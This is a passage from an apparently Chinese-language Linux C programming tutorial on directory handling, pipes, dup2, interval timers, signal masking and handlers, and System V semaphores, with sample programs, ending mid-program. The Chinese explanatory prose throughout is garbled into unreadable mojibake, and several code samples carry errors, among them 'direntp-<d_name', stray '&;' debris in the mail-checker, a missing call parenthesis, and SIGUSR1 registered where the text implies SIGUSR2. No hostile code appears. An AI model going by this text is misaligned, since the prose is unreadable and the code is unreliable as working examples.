¼S_ISCHR�Ƿ���һ���ַ��豸.S_ISBLK�Ƿ���һ�����豸S_ISFIFO�Ƿ� ��һ��FIFO�� 
��.S_ISSOCK�Ƿ���һ��SOCKET�ļ�. ���ǻ�������˵�����ʹ���⼸�����. 
3��Ŀ¼�ļ��Ĳ��� 
�����Ǳ�д�����ʱ����ʱ���Ҫ�õ����ǵ�ǰ�Ĺ���·����C�⺯���ṩ��get 
cwd�����������⡣ 
#include <unistd.h> 

char *getcwd(char *buffer,size_t size); 
�����ṩһ��size��С��buffer,getcwd������ǵ�ǰ��·������buffer��.���buffer 
̫С,�����᷵��-1��һ�������. 
Linux�ṩ�˴�����Ŀ¼��������,����ѧϰ�����Ƚϼ򵥺ͳ��õĺ���. 
#include <dirent.h> 
#include <unistd.h> 
#include <fcntl.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
int mkdir(const char *path,mode_t mode); 
DIR *opendir(const char *path); 
struct dirent *readdir(DIR *dir); 
void rewinddir(DIR *dir); 
off_t telldir(DIR *dir); 
void seekdir(DIR *dir,off_t off); 
int closedir(DIR *dir); 
struct dirent { 
long d_ino; 
off_t d_off; 
unsigned short d_reclen; 
char d_name[NAME_MAX+1]; /* �ļ����� */ 
mkdir�����׾������Ǵ���һ��Ŀ¼,opendir��һ��Ŀ¼Ϊ�Ժ����׼��.readdir��һ 
���򿪵�Ŀ¼.rewinddir�������ض�Ŀ¼�ĺ�����ѧ��rewind����һ��.closedir�ǹر� 
һ��Ŀ¼.telldir��seekdir������ftee��fseek����. 
�������ǿ���һ��С����,���������һ������.������������һ���ļ���,��������� 
���ļ��Ĵ�С������޸ĵ�ʱ��,�����һ��Ŀ¼����������Ŀ¼�������ļ��Ĵ�С�� 
�޸�ʱ��. 
#include <unistd.h> 
#include <stdio.h> 
#include <errno.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <dirent.h> 
#include <time.h> 
static int get_file_size_time(const char *filename) 
{ 
struct stat statbuf; 
if(stat(filename,&statbuf)==-1) 
{ 
printf("Get stat on %s Error:%s\n", 
filename,strerror(errno)); 
return(-1); 
} 
if(S_ISDIR(statbuf.st_mode))return(1); 
if(S_ISREG(statbuf.st_mode)) 
printf("%s size:%ld bytes\tmodified at %s", 
filename,statbuf.st_size,ctime(&statbuf.st_mtime)); 

return(0); 
} 
int main(int argc,char **argv) 
{ 
DIR *dirp; 
struct dirent *direntp; 
int stats; 
if(argc!=2) 
{ 
printf("Usage:%s filename\n\a",argv[0]); 
exit(1); 
} 
if(((stats=get_file_size_time(argv[1]))==0)||(stats==-1))exit(1); 
if((dirp=opendir(argv[1]))==NULL) 
{ 
printf("Open Directory %s Error:%s\n", 
argv[1],strerror(errno)); 
exit(1); 
} 
while((direntp=readdir(dirp))!=NULL) 
if(get_file_size_time(direntp-<d_name)==-1)break; 
closedir(dirp); 
exit(1); 
} 
4���ܵ��ļ� 
Linux�ṩ�����Ĺ��˺��ض������,����more cat 
�ȵ�.���ṩ��< > | <<�ȵ��ض��������.����Щ���˺��� ���������,���õ��˹� 
������������ļ�.ϵͳ����pipe���Դ���һ���ܵ�. 
#include<unistd.h> 

int pipe(int fildes[2]); 
pipe���ÿ��Դ���һ���ܵ�(ͨ�Ż�����).�����óɹ�ʱ,���ǿ��Է����ļ�������fild 
es[0],fildes[1].����fildes[0]�����������ļ�������,��fildes[1]������д���ļ��� 
����. 
��ʵ��ʹ����������ͨ������һ���ӽ���,Ȼ��һ������д,һ�����̶���ʹ�õ�. 
���ڽ���ͨ�ŵ���ϸ�����鿴����ͨ�� 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <errno.h> 
#include <sys/types.h> 
#include <sys/wait.h> 
#define BUFFER 255 
int main(int argc,char **argv) 
{ 
char buffer[BUFFER+1]; 
int fd[2]; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s string\n\a",argv[0]); 
exit(1); 
} 
if(pipe(fd)!=0) 
{ 
fprintf(stderr,"Pipe Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
if(fork()==0) 
{ 
close(fd[0]); 
printf("Child[%d] Write to pipe\n\a",getpid()); 
snprintf(buffer,BUFFER,"%s",argv[1]); 
write(fd[1],buffer,strlen(buffer)); 
printf("Child[%d] Quit\n\a",getpid()); 
exit(0); 
} 
else 
{ 
close(fd[1]); 
printf("Parent[%d] Read from pipe\n\a",getpid()); 
memset(buffer,'\0',BUFFER+1); 
read(fd[0],buffer,BUFFER); 
printf("Parent[%d] Read:%s\n",getpid(),buffer); 
exit(1); 
} 
} 
Ϊ��ʵ���ض������,������Ҫ��������һ������dup2. 
#include <unistd.h> 

int dup2(int oldfd,int newfd); 
dup2����oldfd�ļ�������������newfd�ļ�������,ͬʱ�ر�newfd�ļ�������.Ҳ����˵ 
, 
������newfd������ת��oldfd����.��������ѧϰһ������,������ӽ���׼����ض��� 
��һ���ļ�. 
#include <unistd.h> 
#include <stdio.h> 
#include <errno.h> 
#include <fcntl.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#define BUFFER_SIZE 1024 
int main(int argc,char **argv) 
{ 
int fd; 
char buffer[BUFFER_SIZE]; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s outfilename\n\a",argv[0]); 
exit(1); 
} 
if((fd=open(argv[1],O_WRONLY|O_CREAT|O_TRUNC,S_IRUSR|S_IWUSR))==-1) 
{ 
fprintf(stderr,"Open %s Error:%s\n\a",argv[1],strerror(errno)); 
exit(1); 
} 
if(dup2(fd,STDOUT_FILENO)==-1) 
{ 
fprintf(stderr,"Redirect Standard Out Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
fprintf(stderr,"Now,please input string"); 
fprintf(stderr,"(To quit use CTRL+D)\n"); 
while(1) 
{ 
fgets(buffer,BUFFER_SIZE,stdin); 
if(feof(stdin))break; 
write(STDOUT_FILENO,buffer,strlen(buffer)); 
} 
exit(0); 
} 
����,�ļ�һ�����Ǿ���ʱ�����۵�����,ѧϰ�����ļ��Ĳ���������ʵ�Ѿ�����д��һ 
Щ�Ƚ����õĳ�����.���ǿ��Ա�дһ��ʵ������dir,mkdir,cp,mv�ȵȳ��õ��ļ����� 
������. 
�벻���Լ�д������һ����? 

4)�����������--ʱ����� 
ǰ��:Linux�µ�ʱ����� 
��һ������ѧϰLinux��ʱ���ʾ�ͼ��㺯�� 
ʱ��ı�ʾ 
ʱ��Ĳ��� 
��ʱ����ʹ�� 
1��ʱ���ʾ �ڳ�����,���Ǿ���Ҫ���ϵͳ��ǰ��ʱ��,��������ʹ��date���� 
��������.���ʱ�����ǿ���ʹ�������������� 
#include <time.h> 

time_t time(time_t *tloc); 
char *ctime(const time_t *clock); 
time�������ش�1970��1��1��0������������.�洢��time_t�ṹ֮��.������������ķ� 
��ֵ����������˵û��ʲôʵ������.���ʱ������ʹ�õڶ�������������ת��Ϊ�ַ��� 
.. ��������ķ��������ǹ̶���:һ������ֵΪ. Thu Dec 7 14:58:59 2000 ����ַ��� 
�ĳ����ǹ̶���Ϊ26 
2��ʱ��Ĳ��� ��ʱ������Ҫ�������ִ�е�ʱ��.��������Ҫ���㷨����ʱ����� 
..���ʱ�����ʹ�������������. 
#include <sys/time.h> 

int gettimeofday(struct timeval *tv,struct timezone *tz); 
strut timeval { 
long tv_sec; /* ���� */ 
long tv_usec; /* ΢���� */ 
}; 
gettimeofday��ʱ�䱣���ڽṹtv֮��.tzһ������ʹ��NULL������. 
#include <sys/time.h< 
#include <stdio.h< 
#include <math.h< 
void function() 
{ 
unsigned int i,j; 
double y; 
for(i=0;i<1000;i++) 
for(j=0;j<1000;j++) 
y=sin((double)i); 
} 
main() 
{ 
struct timeval tpstart,tpend; 
float timeuse; 
gettimeofday(&tpstart,NULL); 
function(); 
gettimeofday(&tpend,NULL); 
timeuse=1000000*(tpend.tv_sec-tpstart.tv_sec)+ 
tpend.tv_usec-tpstart.tv_usec; 
timeuse/=1000000; 
printf("Used Time:%f\n",timeuse); 
exit(0); 
} 
����������������ִ��ʱ��,���ǿ���ʹ�����������ϵͳ���ܵĲ���,�����Ǻ����� 
����Ч�ʷ���.���һ����ϵ�һ����������: Used Time:0.556070 
3����ʱ����ʹ�� Linux����ϵͳΪÿһ�������ṩ��3���ڲ������ʱ��. 
ITIMER_REAL:����ʵ��ʱ��.��ʱ��ʱ�򷢳�SIGALRM�ź�. 
ITIMER_VIRTUAL:������Чʱ��(����ִ�е�ʱ��).����SIGVTALRM�ź�. 
ITIMER_PROF:���ٽ��̵���Чʱ���ϵͳʱ��(Ϊ���̵����õ�ʱ��).�������������һ 
��ʹ����������ϵͳ�ں�ʱ����û�ʱ��.����SIGPROF�ź�. 
����Ĳ���������: 
#include <sys/time.h> 
int getitimer(int which,struct itimerval *value); 
int setitimer(int which,struct itimerval *newval, 
struct itimerval *oldval); 
struct itimerval { 
struct timeval it_interval; 
struct timeval it_value; 
} 
getitimer�����õ������ʱ����ʱ��ֵ.������value�� setitimer�������ü����ʱ�� 
��ʱ��ֵΪnewval.������ֵ������oldval��. which��ʾʹ��������ʱ���е���һ��. 
itimerval�ṹ�е�it_value�Ǽ��ٵ�ʱ��,�����ֵΪ0��ʱ��ͷ�����Ӧ���ź���. Ȼ 
������Ϊit_intervalֵ. 
#include <sys/time.h> 
#include <stdio.h> 
#include <unistd.h> 
#include <signal.h> 
#include <string.h> 
#define PROMPT "ʱ���Ѿ���ȥ��������\n\a" 
char *prompt=PROMPT; 
unsigned int len; 
void prompt_info(int signo) 
{ 
write(STDERR_FILENO,prompt,len); 
} 
void init_sigaction(void) 
{ 
struct sigaction act; 
act.sa_handler=prompt_info; 
act.sa_flags=0; 
sigemptyset(&act.sa_mask); 
sigaction(SIGPROF,&act,NULL); 
} 
void init_time() 
{ 
struct itimerval value; 
value.it_value.tv_sec=2; 
value.it_value.tv_usec=0; 
value.it_interval=value.it_value; 
setitimer(ITIMER_PROF,&value,NULL); 
} 
int main() 
{ 
len=strlen(prompt); 
init_sigaction(); 
init_time(); 
while(1); 
exit(0); 
} 
�������ÿִ��������֮������һ����ʾ. 

5)Linux�����������--�źŴ��� 
Linux�µ��ź��¼� 
ǰ��:��һ����������һ��Linux�µ��źŴ�����. 
Linux�µ��źŴ�����: 
�źŵĲ��� 
�źŵĴ��� 
�����źź��� 
һ��ʵ�� 
1���źŵĲ��� 
Linux�µ��źſ��������DOS�µ�INT������Windows�µ��¼�.����һ���źŷ���ʱ 
�����ŵ��źžͻᷢ�͸���Ӧ�Ľ���.��Linux�µ��ź������¼���. ����ʹ�� kill -l 
������Եõ����µ�������: 
1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 
5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 
9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR2 
13) SIGPIPE 14) SIGALRM 15) SIGTERM 17) SIGCHLD 
18) SIGCONT 19) SIGSTOP 20) SIGTSTP 21) SIGTTIN 
22) SIGTTOU 23) SIGURG 24) SIGXCPU 25) SIGXFSZ 
26) SIGVTALRM 27) SIGPROF 28) SIGWINCH 29) SIGIO 
30) SIGPWR 
������Щ�źŵ���ϸ������鿴man 7 signal��������. �ź��¼��ķ�����������Դ 
:һ����Ӳ����ԭ��(�������ǰ����˼���),һ���������ԭ��(��������ʹ��ϵͳ������ 
����������ź�). ��õ��ĸ������źŵ�ϵͳ������kill, raise, alarm��setit 
imer����. setitimer���������ڼ�ʱ����ʹ�� ��һ����ѧϰ. 
#include <sys/types.h> 
#include <signal.h> 
#include <unistd.h> 
int kill(pid_t pid,int sig); 
int raise(int sig); 
unisigned int alarm(unsigned int seconds); 
killϵͳ���ø�������̷����ź�sig. 
���pid������,��ô���ź�sig�����͵�����pid. 
���pid����0,��ô�ź�sig�����͵����Ժ�pid������ͬһ��������Ľ��� 
���pid����-1,��ô�źŷ������еĽ��̱��еĽ���,���������ĸ����̺�. 
���pid����-1,��0һ��,ֻ�Ƿ��ͽ�������-pid. 
�����������ǵ�һ�����.���ǵ��������ػ�������һ�ڵ�������?�����Ǹ�ʱ������ 
������ɱ���˸������ػ����̵Ĵ��� 
raiseϵͳ�������Լ�����һ��sig�ź�.���ǿ����������Ǹ�������ʵ��������ܵ�. 
alarm������ʱ���е��ϵ��,�������������seconds������Լ�����һ��SIGALRM�ź� 
.. ���������������ʲô�����? 
#include <unistd.h> 
main() 
{ 
unsigned int i; 
alarm(1); 
for(i=0;1;i++) 
printf("I=%d",i); 
} 
SIGALRM��ȱʡ�����ǽ�������,���Գ�����1��֮�����,����Կ���������IֵΪ���� 
,���Ƚ�һ�´�ҵ�ϵͳ���ܲ���(�ҵ���2232). 
2���źŲ��� ��ʱ������ϣ��������ȷ��ִ��,����������ܵ��źŵ�Ӱ��,������ 
��ϣ�������Ǹ�������1����֮�󲻽���.���ʱ�����Ǿ�Ҫ�����źŵĲ�����. 
�źŲ�����õķ������ź�����.�ź�����Ҫ�õ�����ļ�������. 
#include <signal.h> 
int sigemptyset(sigset_t *set); 
int sigfillset(sigset_t *set); 
int sigaddset(sigset_t *set,int signo); 
int sigdelset(sigset_t *set,int signo); 
int sigismember(sigset_t *set,int signo); 
int sigprocmask(int how,const sigset_t *set,sigset_t *oset); 
sigemptyset������ʼ���źż���set,��set����Ϊ��.sigfillsetҲ��ʼ���źż���,ֻ 
�ǽ��źż�������Ϊ�����źŵļ���.sigaddset���ź�signo���뵽�źż���֮��,sigd 
elset���źŴ��źż�����ɾ��.sigismember��ѯ�ź��Ƿ����źż���֮��. 
sigprocmask����Ϊ�ؼ���һ������.��ʹ��֮ǰҪ�����ú��źż���set.����������� 
���ǽ�ָ�����źż���set���뵽���̵��ź���������֮��ȥ,����ṩ��oset��ô��ǰ 
�Ľ����ź��������Ͻ��ᱣ����oset����.����how���������Ĳ�����ʽ. 
SIG_BLOCK:����һ���źż��ϵ���ǰ���̵���������֮��. 
SIG_UNBLOCK:�ӵ�ǰ����������֮��ɾ��һ���źż���. 
SIG_SETMASK:����ǰ���źż�������Ϊ�ź���������. 
��һ��ʵ��������ʹ���⼸������. 
#include <signal.h> 
#include <stdio.h> 
#include <math.h> 
#include <stdlib.h> 
int main(int argc,char **argv) 
{ 
double y; 
sigset_t intmask; 
int i,repeat_factor; 
if(argc!=2) 
{ 
fprintf(stderr,"Usage:%s repeat_factor\n\a",argv[0]); 
exit(1); 
} 
if((repeat_factor=atoi(argv[1]))<1)repeat_factor=10; 
sigemptyset(&intmask); /* ���źż�������Ϊ�� */ 
sigaddset(&intmask,SIGINT); /* �����ж� Ctrl+C �ź�*/ 
while(1) 
{ 
/*�����ź�,���ǲ�ϣ������ԭ���ļ������Բ���ΪNULL*/ 
sigprocmask(SIG_BLOCK,&intmask,NULL); 
fprintf(stderr,"SIGINT signal blocked\n"); 
for(i=0;i<repeat_factor;i++)y=sin((double)i); 
fprintf(stderr,"Blocked calculation is finished\n"); 
/* ȡ������ */ 
sigprocmask(SIG_UNBLOCK,&intmask,NULL); 
fprintf(stderr,"SIGINT signal unblocked\n"); 
for(i=0;i<repeat_factor;i++)y=sin((double)i); 
fprintf(stderr,"Unblocked calculation is finished\n"); 
} 
exit(0); 
} 
���������е�ʱ������Ҫʹ��Ctrl+C������.��������ڵ�һ�����ʱ�򷢳�SIGINT�ź� 
,�����ź��Ѿ�������,���Գ���û�з�ӳ.ֻ�е��źű�ȡ��������ʱ�����Ż����. 
ע������ֻҪ����һ��SIGINT�źžͿ�����,��Ϊ�ź�����ֻ�ǽ��źż��뵽�ź����� 
����֮��,��û�ж�������ź�.һ���ź�����ȡ����,����źžͻᷢ������. 
��ʱ������ϣ�����ź�������ʱ�ķ�ӳ��,���統ӵ������Ctrl+Cʱ,���ǲ���ʲô���� 
Ҳ����,����������û���������������,�벻Ҫ����,������ʲô��ӳҲû�е�. ��� 
ʱ������Ҫ�õ�sigaction����. 
#include <signal.h> 

int sigaction(int signo,const struct sigaction *act, 
struct sigaction *oact); 
struct sigaction { 
void (*sa_handler)(int signo); 
void (*sa_sigaction)(int siginfo_t *info,void *act); 
sigset_t sa_mask; 
int sa_flags; 
void (*sa_restore)(void); 
} 
��������ͽṹ�������ǲ����е�ֲ���.��Ҫ�����������,��ʵ���������ʹ���൱ 
�򵥵�.�����Ƚ���һ�¸��������ĺ���. signo�ܼ򵥾�������Ҫ������ź���,������ 
�κεĺϷ����ź�.�������źŲ��ܹ�ʹ��(SIGKILL��SIGSTOP). act��������Ҫ����� 
�źŽ�����δ������Ϣ.oact�����˾�����ǰ����������Ĵ�����Ϣ��,��Ҫ������ 
����Ϣ��,һ����NULL��OK��. 
�źŽṹ�е㸴��.��Ҫ������������ѧϰ. 
sa_handler��һ��������ָ��,���ָ��ָ��һ������,���������һ������.��������� 
������Ҫ���е��źŲ����ĺ���. sa_sigaction,sa_restore��sa_handler����,ֻ 
�ǲ�����ͬ����.������Ԫ�����Ǻ���ʹ��,�Ͳ�����. 
sa_flags���������źŲ����ĸ������.һ������Ϊ0����.sa_mask�����Ѿ�ѧϰ���� 
��ʹ�õ�ʱ��������sa_handlerָ�����ǵ�һ���źŲ�������,�Ϳ�����.sa_handler�� 
���������ֵ:SIG_DEL��SIG_IGN.SIG_DEL��ʹ��ȱʡ���źŲ�������,��SIG_IGN��ʹ�� 
���Ը��źŵĲ�������. 
�����������,����ʹ��һ��ʵ����˵��.��������������Բ�׽�û���CTRL+C�ź�.���� 
��һ����ʾ���. 
#include <signal.h> 
#include <stdio.h> 
#include <string.h> 
#include <errno.h> 
#include <unistd.h> 
#define PROMPT "������ֹ������?" 
char *prompt=PROMPT; 
void ctrl_c_op(int signo) 
{ 
write(STDERR_FILENO,prompt,strlen(prompt)); 
} 
int main() 
{ 
struct sigaction act; 
act.sa_handler=ctrl_c_op; 
sigemptyset(&act.sa_mask); 
act.sa_flags=0; 
if(sigaction(SIGINT,&act,NULL)<0) 
{ 
fprintf(stderr,"Install Signal Action Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
while(1); 
} 
�����������źŲ�������֮��,����ʹ����write������û��ʹ��fprintf����.����Ϊ 
����Ҫ���ǵ������������.����������źŲ�����ʱ������һ���źŷ���,��ô����� 
���������? Ϊ�˴������źŴ��������е�ʱ���źŵķ���,������Ҫ����sa_mask�� 
Ա. ���ǽ�����Ҫ���ε��ź���ӵ�sa_mask�ṹ����ȥ,������Щ�������źŴ����ʱ 
��ͻᱻ���ε���. 
3�������źź��� �����źŵĲ����ʹ���Ƚϸ���,�����ٽ��ܼ����źŲ�������. 

#include <unistd.h> 
#include <signal.h> 
int pause(void); 
int sigsuspend(const sigset_t *sigmask); 
pause�����ܼ�,���ǹ������ֱ��һ���źŷ�����.��sigsuspendҲ�ǹ������ֻ���� 
���õ�ʱ����sigmaskȡ����ǰ���ź���������. 
#include <sigsetjmp> 
int sigsetjmp(sigjmp_buf env,int val); 
void siglongjmp(sigjmp_buf env,int val); 
���ǵ�goto����������setjmp��longjmp������.�������ź���ת����Ҳ����ʵ�ֳ���� 
��ת�����ǿ��ԴӺ���֮����ת��������Ҫ�ĵط�. 
�������漸������,���Ǻ�������,����ֻ��˵����һ��,��ϸ�����鿴��������. 
4��һ��ʵ�� ���ǵ��������ػ����̴������ĸ�������?�ػ��������������ǰ��Ǹ� 
�����ǿһ��. ��������������Ҳ���Լ���û����ʼ�.�����ṩ��һ������,����� 
�����������ʾ���µ��ʼ�����,�����������SIGUSR2�ź�,���������ṩ��ʾ���� 
����SIGUSR1�ź�. 
#include <unistd.h> 
#include <stdio.h> 
#include <errno.h> 
#include <fcntl.h> 
#include <signal.h> 
#include <string.h> 
#include <pwd.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
/* Linux ��Ĭ�θ��˵������ַ�� /var/spool/mail/ */ 
#define MAIL_DIR "/var/spool/mail/" 
/* ˯��10���� */ 
#define SLEEP_TIME 10 
#define MAX_FILENAME 255 
unsigned char notifyflag=1; 
long get_file_size(const char *filename) 
{ 
struct stat buf; 
if(stat(filename,&;buf)==-1) 
{ 
if(errno==ENOENT)return 0; 
else return -1; 
} 
return (long)buf.st_size; 
} 
void send_mail_notify(void) 
{ 
fprintf(stderr,"New mail has arrived\007\n"); 
} 
void turn_on_notify(int signo) 
{ 
notifyflag=1; 
} 
void turn_off_notify(int signo) 
{ 
notifyflag=0; 
} 
int check_mail(const char *filename) 
{ 
long old_mail_size,new_mail_size; 
sigset_t blockset,emptyset; 
sigemptyset(&;blockset); 
sigemptyset(&;emptyset); 
sigaddset(&;blockset,SIGUSR1); 
sigaddset(&;blockset,SIGUSR2); 
old_mail_size=get_file_size(filename); 
if(old_mail_size<0)return 1; 
if(old_mail_size>0) send_mail_notify(); 
sleep(SLEEP_TIME); 
while(1) 
{ 
if(sigprocmask(SIG_BLOCK,&;blockset,NULL)<0) return 1; 
while(notifyflag==0)sigsuspend(&;emptyset); 
if(sigprocmask(SIG_SETMASK,&;emptyset,NULL)<0) return 1; 
new_mail_size=get_file_size(filename); 
if(new_mail_size>old_mail_size)send_mail_notify; 
old_mail_size=new_mail_size; 
sleep(SLEEP_TIME); 
} 
} 
int main(void) 
{ 
char mailfile[MAX_FILENAME]; 
struct sigaction newact; 
struct passwd *pw; 
if((pw=getpwuid(getuid()))==NULL) 
{ 
fprintf(stderr,"Get Login Name Error:%s\n\a",strerror(errno)); 
exit(1); 
} 
strcpy(mailfile,MAIL_DIR); 
strcat(mailfile,pw->pw_name); 
newact.sa_handler=turn_on_notify; 
newact.sa_flags=0; 
sigemptyset(&;newact.sa_mask); 
sigaddset(&;newact.sa_mask,SIGUSR1); 
sigaddset(&;newact.sa_mask,SIGUSR2); 
if(sigaction(SIGUSR1,&;newact,NULL)<0) 
fprintf(stderr,"Turn On Error:%s\n\a",strerror(errno)); 
newact.sa_handler=turn_off_notify; 
if(sigaction(SIGUSR1,&;newact,NULL)<0) 
fprintf(stderr,"Turn Off Error:%s\n\a",strerror(errno)); 
check_mail(mailfile); 
exit(0); 
} 
�źŲ�����һ���ǳ����ӵ�����,����������֮�еĸ��ӳ̶Ȼ�Ҫ����,������볹�׵� 
Ū����źŲ����ĸ�������,��ô���˴�������ϰ���⻹Ҫ�࿴�����ֲ�.����������� 
ֻ��һ���ʹ�õĻ�,��������ļ�������Ҳ�Ͳ����. ���Ǿͽ��ܵ�������. 

6)Linux�����������--��Ϣ���� 
ǰ��:Linux�µĽ���ͨ��(IPC) 
Linux�µĽ���ͨ��(IPC) 
POSIX�����ź��� 
System V�ź��� 
System V��Ϣ���� 
System V�����ڴ� 
1��POSIX�����ź��� �����ѧϰ������ϵͳ,��ô�϶���ϤPV������.PV������ԭ�� 
����.Ҳ���ǲ����ǲ������жϵ�,��һ����ʱ����,ֻ�ܹ���һ�����̵Ĵ�����CPU���� 
ִ��.��ϵͳ����,��ʱ��Ϊ��˳����ʹ�úͱ���������Դ,���������źŵĸ���. ���� 
����Ҫʹ��һ̨��ӡ��,�����ͬһʱ�����������������ӡ�����,��ô���յĽ���� 
��ʲô��.Ϊ�˴����������,POSIX��׼����������ź����������ź����ĸ���,����Li 
nuxֻʵ���������ź���,�����������ֻ�ǽ��������ź�����. �ź�����ʹ����Ҫ���� 
������������Դ,ʹ����Դ��һ��ʱ��ֻ��һ��������ӵ��.Ϊ�����ǿ���ʹ��һ���ź� 
��.���źŵƵ�ֵΪĳ��ֵ��ʱ��,�ͱ�����ʱ��Դ������ʹ��.����ͱ�>ʾ����ʹ��. 
Ϊ���ṩЧ��,ϵͳ�ṩ�����漸������ 
POSIX�������ź����ĺ��������¼���: 
#include <semaphore.h> 
int sem_init(sem_t *sem,int pshared,unsigned int value); 
int sem_destroy(sem_t *sem); 
int sem_wait(sem_t *sem); 
int sem_trywait(sem_t *sem); 
int sem_post(sem_t *sem); 
int sem_getvalue(sem_t *sem); 
sem_init����һ���źŵ�,����ʼ����ֵΪvalue.pshared�������ź����ܷ��ڼ������� 
�乲��.����ĿǰLinux��û��ʵ�ֽ��̼乲���źŵ�,�������ֵֻ�ܹ�ȡ0. sem_dest 
roy������ɾ���źŵƵ�.sem_wait���ý���������,ֱ���źŵƵ�ֵ����0.����������� 
��ʱ���Զ��Ľ��źŵƵ�ֵ�ļ�һ.sem_post��sem_wait�෴,�ǽ��źŵƵ����ݼ�һͬ 
ʱ�����źŻ��ѵȴ��Ľ���..sem_trywait��sem_wait��ͬ,������������,���źŵƵ�ֵ 
Ϊ0��ʱ�򷵻�EAGAIN,��ʾ�Ժ�����.sem_getvalue�õ��źŵƵ�ֵ. 
����Linux��֧��,����û�а취��Դ���������. 
�⼸��������ʹ���൱�򵥵�.����������һ������Ҫ��һ��ϵͳ��ӡ����ӡ��ҳ.���� 
���ȴ���һ���źŵ�,��ʹ���ʼֵΪ1,��ʾ������һ����Դ����.Ȼ��һ�����̵���se 
m_wait�������ʱ���źŵƵ�ֵΪ1,���������������,��ӡ����ʼ��ӡ��,ͬʱ�źŵ� 
��ֵΪ0 ��. ����ڶ�������Ҫ��ӡ,����sem_waitʱ��,�����źŵƵ�ֵΪ0,��Դ���� 
��,���Ǳ�������.����һ�����̴�ӡ����Ժ�,����sem_post�źŵƵ�ֵΪ1��,���ʱ�� 
ϵͳ֪ͨ�ڶ�������,���ǵڶ������̵�sem_wait����.�ڶ������̿�ʼ��ӡ��. 
�������ǿ���ʹ���߳��������������.���ǻ��ں������ʲô���̵߳�.��������� 
���⼸�������ĳ���Ҫ���� -lrtѡ��,������librt.so�� 
2��System V�ź��� Ϊ�˽�������ĸ�����,����Ҳ����ʹ��System V�ź���.�����˵� 
��Linuxʵ����System V�ź���.�������ǾͿ�����ʵ����������. System V�ź����ĺ� 
����Ҫ�����漸��. 
#include <sys/types.h> 
#include <sys/ipc.h> 
#include <sys/sem.h> 
key_t ftok(char *pathname,char proj); 
int semget(key_t key,int nsems,int semflg); 
int semctl(int semid,int semnum,int cmd,union semun arg); 
int semop(int semid,struct sembuf *spos,int nspos); 
struct sembuf { 
short sem_num; /* ʹ����һ���ź� */ 
short sem_op; /* ����ʲô���� */ 
short sem_flg; /* �����ı�־ */ 
}; 
ftok�����Ǹ���pathname��proj������һ���ؼ���.semget����һ���ź���.�ɹ�ʱ���� 
�źŵ�ID,key��һ���ؼ���,��������ftok������Ҳ������IPC_PRIVATE������ϵͳѡ�� 
һ���ؼ���. nsems�������Ǵ������źŸ���.semflg�Ǵ�����Ȩ�ޱ�־,�����Ǵ���һ�� 
�ļ��ı�־��ͬ. 
semctl���ź�������һϵ�еĿ���.semid��Ҫ�������źű�־,semnum���źŵĸ���,cm 
d�ǲ���������.�����õ�����ֵ��:SETVAL(�����ź�����ֵ)��IPC_RMID(ɾ���źŵ�). 
arg��һ����cmd�Ĳ���. 
semop�Ƕ��źŽ��в����ĺ���.semid���źű�־,spos��һ�������������Ҫ����ʲô 
����,nspos��������ĸ���. ���sem_op����0,��ô������sem_op���뵽�ź�����ֵ�� 
,�����ѵȴ��ź����ӵĽ���. ���Ϊ0,���ź�����ֵ��0��ʱ��,��������,��������ֱ 
���ź�����ֵΪ0. ���С��0,�����ж��ź�����ֵ���������ֵ.������Ϊ0���ѵȴ� 
�ź���Ϊ0�Ľ���,���С��0��������.�������0,��ô���ź��������ȥ���ֵ������ 
.. 
��������һ��һ��ʵ����˵���⼸��������ʹ�÷���.��������ñ�׼��������������� 
���õĴ�ӡ��. 
#include <stdio.h> 
#include <unistd.h> 
#include <limits.h> 
#include <errno.h> 
#include <string.h> 
#include <stdlib.h> 
#include <sys/stat.h> 
#include <sys/wait.h> 
#include <sys/ipc.h> 
#include <sys/sem.h> 
#define PERMS S_IRUSR|S_IWUSR 
void init_semaphore_struct(struct sembuf *sem,int semnum, 
int semop,int semflg) 
{ 
/* ��ʼ���źŵƽṹ */ 
sem->sem_num=semnum; 
sem->sem_op=semop; 
sem->sem_flg=semflg; 
} 
int del_semaphore(int semid) 
{ 
/* �źŵƲ��������Ľ�������ɾ��,�������ûɾ���Ļ�(��1��Ϊ0) 
������ipcs����鿴���źŵ�,��ipcrm����ɾ���źŵƵ� 
*/ 
#if 1 
return semctl(semid,0,IPC_RMID); 
#endif 
} 
int main(int argc,char **argv) 
{ 
char buffer[MAX_CANON],*c; 
int i,n; 
int semid,semop_ret,status; 
pid_t childpid; 
struct sembuf semwait,semsignal; 
if((argc!=2)||((n=atoi(argv[1]))<1)) 
{ 
fprintf(stderr,"Usage:%s number\n\a",argv[0]); 
exit(1); 
} 
/* ʹ��IPC_PRIVATE ��ʾ��ϵͳѡ��һ���ؼ��������� */ 
/* �����Ժ��źŵƵĳ�ʼֵΪ0 */ 
if((semid=semget(IPC_PRIVATE,1,PERMS))==-1) 
{ 
fprintf(stderr,"[%d]:Acess Semaphore Error:%s\n\a", 
getpid(),strerror(errno)); 
exit(1); 
} 
/* semwait��Ҫ����Դ�Ĳ���(-1) */ 
init_semaphore_struct(&semwait,0,-1,0); 
/* semsignal���ͷ���Դ�Ĳ���(+1) */ 
init_semaphore_struct(&semsignal,0,1,0); 
/* ��ʼ��ʱ����һ��ϵͳ��Դ(һ����׼�������) */ 
if(semop(semid,&semsignal,1)==-1) 
{ 
fprintf(stderr,"[%d]:Increment Semaphore Error:%s\n\a", 
getpid(),strerror(errno)); 
if(del_semaphore(semid)==-1) 
fprintf(stderr,"[%d]:Destroy Semaphore Error:%s\n\a", 
getpid(),strerror(errno)); 
exit(1); 
} 
/* ����һ�������� */ 
for(i=0;i<n;i++) 
if(childpid=fork()) break; 
sprintf(buffer,"[i=%d]-->[Process=%d]-->[Parent=%d]-->[Child=%d]\n", 
i,getpid(),getppid(),childpid); 
c=buffer; 
/* ����Ҫ����Դ,����ԭ�Ӳ��� */ 
